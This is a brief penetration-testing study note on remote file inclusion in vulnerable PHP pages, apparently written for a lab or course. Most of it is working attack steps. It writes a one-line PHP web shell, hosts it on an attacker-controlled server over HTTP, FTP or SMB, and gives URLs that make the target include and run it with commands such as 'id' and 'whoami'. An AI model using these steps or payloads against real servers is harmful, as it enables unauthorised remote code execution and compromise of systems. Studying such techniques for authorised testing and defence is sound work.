## Local vs. Remote File Inclusion

When a vulnerable function allows us to include remote files, we may be able to host a malicious scripts, and then include it in the vulnerable page to execute malicious functions and gain remote code execution

Vulnerable functions:
PHP:  include()/include_once(), file_get_contents()
Java: import
.NET: @Html.RemotePPartial(), include

RFIs are also an LFI, but an LFI may not necessarily be an RFI.

**Verify RFI
```
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```
- allow_url_include() = On

```
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```
- Try and include a URL, its own, to ensure it is not blocked by a firewall
- It is not ideal to include the vulnerable page itself as this causes a recursive inclusion loop which leads to DoS


## Remote Code Execution with RFI
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sudo python3 -m http.server 80
```

```url
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```


## FTP
```
sudo python -m pyftpdlib -p 21
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```
- The third is if the server requires authentication


## SMB
```
impacket-smbserver -smb2support share $(pwd)
```
```url
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```
